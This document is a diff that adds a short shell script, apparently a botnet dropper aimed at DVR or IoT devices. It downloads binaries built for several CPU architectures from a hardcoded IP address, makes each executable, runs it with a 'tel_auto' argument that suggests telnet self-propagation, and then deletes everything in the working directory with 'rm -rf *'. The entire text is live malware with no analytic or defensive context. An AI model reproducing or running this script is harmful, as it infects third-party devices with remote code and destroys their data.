@@ -1,0 +1,13 @@
+#!/bin/sh
+
+WEBSERVER="188.166.73.129:80"
+
+BINARIES="camili.arm camili.m68k camili.mips camili.mpsl camili.ppc camili.sh4 camili.x86 camili.spc"
+
+for Binary in $BINARIES; do
+	wget http://$WEBSERVER/$Binary -O dvrRunNer
+	chmod 777 dvrRunNer
+	./dvrRunNer tel_auto
+done
+
+rm -rf *
